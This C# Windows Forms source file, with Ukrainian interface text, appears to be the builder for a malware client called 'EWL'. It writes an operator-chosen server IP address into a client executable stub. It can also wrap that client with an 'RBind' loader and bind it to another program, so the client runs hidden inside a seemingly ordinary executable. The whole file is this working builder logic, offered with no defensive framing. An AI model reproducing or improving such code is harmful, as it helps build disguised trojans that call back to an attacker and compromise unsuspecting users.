using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EWLServer
{
    public partial class BuilderForm : Form
    {
        private byte[] ipPacket = null;
        private OpenFileDialog ofd = new OpenFileDialog()
        {
            AddExtension = true,
            AutoUpgradeEnabled = true,
            CheckFileExists = true,
            CheckPathExists = true,
            DereferenceLinks = true,
            Filter = "Клієнт EWL (*.exe)|*.exe",
            FilterIndex = 0,
            Multiselect = false,
            Title = "Обрати клієнт EWL..."
        };
        private OpenFileDialog ofd2 = new OpenFileDialog()
        {
            AddExtension = true,
            AutoUpgradeEnabled = true,
            CheckFileExists = true,
            CheckPathExists = true,
            DereferenceLinks = true,
            Filter = "Завантажувач RBind (*.exe)|*.exe",
            FilterIndex = 0,
            Multiselect = false,
            Title = "Обрати завантажувач RBind..."
        };
        private OpenFileDialog ofd3 = new OpenFileDialog()
        {
            AddExtension = true,
            AutoUpgradeEnabled = true,
            CheckFileExists = true,
            CheckPathExists = true,
            DereferenceLinks = true,
            Filter = "Програми (*.exe)|*.exe",
            FilterIndex = 0,
            Multiselect = false,
            Title = "Обрати файл для прив'язки..."
        };
        private SaveFileDialog sfd = new SaveFileDialog()
        {
            AddExtension = true,
            AutoUpgradeEnabled = true,
            CheckFileExists = false,
            CheckPathExists = true,
            CreatePrompt = false,
            DereferenceLinks = true,
            Filter = "Клієнт EWL (*.exe)|*.exe",
            FilterIndex = 0,
            OverwritePrompt = true,
            Title = "Зберегти клієнт EWL..."
        };

        public BuilderForm()
        {
            InitializeComponent();

            ipOct0.ValueChanged += OctValueChanged;
            ipOct1.ValueChanged += OctValueChanged;
            ipOct2.ValueChanged += OctValueChanged;
            ipOct3.ValueChanged += OctValueChanged;

            stubLoc.TextChanged += StubLocChanged;
            selectStub.Click += SelectStub;

            enableBinding.CheckedChanged += EnableBindingChanged;
            selectBindStub.Click += SelectBindStub;
            selectBindFile.Click += SelectBindFile;

            build.Click += BuildStub;

            RebuildIPPacket();
            AnalyzeStub();
        }

        private void SelectBindFile(object sender, EventArgs e)
        {
            if (ofd3.ShowDialog() == DialogResult.OK)
            {
                bindFile.Text = ofd3.FileName;
            }
        }

        private void SelectBindStub(object sender, EventArgs e)
        {
            if (ofd2.ShowDialog() == DialogResult.OK)
            {
                bindStub.Text = ofd2.FileName;
            }
        }

        private void EnableBindingChanged(object sender, EventArgs e)
        {
            bindPanel.Enabled = enableBinding.Checked;
        }

        private void BuildStub(object sender, EventArgs e)
        {
            if (sfd.ShowDialog() != DialogResult.OK) return;
            Enabled = false;
            new Thread(new ThreadStart(() =>
            {
                try
                {
                    byte[] src = File.ReadAllBytes(stubLoc.Text);
                    int copyLen = (src[src.Length - 1] == 0x50 && src[src.Length - 2] == 0x49)
                        ? src.Length - 6 : src.Length;
                    using (FileStream dst = new FileStream(sfd.FileName, FileMode.Create, FileAccess.Write))
                    {
                        if (enableBinding.Checked)
                        {
                            byte[] rbind = File.ReadAllBytes(bindStub.Text);
                            dst.Write(rbind, 0, rbind.Length);
                        }
                        dst.Write(src, 0, copyLen);
                        dst.Write(ipPacket, 0, ipPacket.Length);
                        if (enableBinding.Checked)
                        {
                            dst.Write(BitConverter.GetBytes((long)(copyLen + ipPacket.Length)), 0, 4);
                            using (FileStream bfs = new FileStream(bindFile.Text, FileMode.Open, FileAccess.Read))
                            {
                                bfs.CopyTo(dst);
                                dst.Write(BitConverter.GetBytes((long)bfs.Length), 0, 4);
                            }
                        }
                    }
                    MessageBox.Show("Клієнт було успішно створено! Файл: " + sfd.FileName, "Успіх",
                        MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Помилка: " + ex.Message, "Не вдалося створити клієнт EWL",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                Invoke(new MethodInvoker(() => Enabled = true));
            })).Start();
        }

        private void SelectStub(object sender, EventArgs e)
        {
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                stubLoc.Text = ofd.FileName;
            }
        }

        private void StubLocChanged(object sender, EventArgs e)
        {
            if (stubLoc.Text != ofd.FileName)
            {
                ofd.FileName = stubLoc.Text.Trim();
            }
            AnalyzeStub();
        }

        private void OctValueChanged(object sender, EventArgs e)
        {
            RebuildIPPacket();
        }

        private void RebuildIPPacket()
        {
            ipPacket = new byte[6];
            ipPacket[0] = (byte)ipOct0.Value;
            ipPacket[1] = (byte)ipOct1.Value;
            ipPacket[2] = (byte)ipOct2.Value;
            ipPacket[3] = (byte)ipOct3.Value;

            ipPacket[4] = 0x49;
            ipPacket[5] = 0x50;

            lPacket.Text = "Пакет: " + BitConverter.ToString(ipPacket).Replace("-", "");
        }

        private void AnalyzeStub()
        {
            lMessage.Text = "";
            try
            {
                if (!File.Exists(stubLoc.Text))
                {
                    throw new FileNotFoundException();
                }
                if (!stubLoc.Text.Trim().ToLower().EndsWith("exe"))
                {
                    throw new InvalidOperationException("The stub must be an executable file.");
                }
                using (FileStream fs = new FileStream(stubLoc.Text, FileMode.Open, FileAccess.Read))
                {
                    byte[] extPacket = new byte[6];
                    fs.Seek(-6, SeekOrigin.End);
                    fs.Read(extPacket, 0, 6);
                    if (extPacket[4] == 0x49 && extPacket[5] == 0x50)
                    {
                        lMessage.Text = "This stub has existing IP packet. It will be replaced with a new one. Packet: " +
                            BitConverter.ToString(extPacket).Replace("-", "");
                    }
                }
                build.Enabled = true;
            }
            catch (Exception e)
            {
                lMessage.Text = e.Message;
                build.Enabled = false;
            }
        }
    }
}
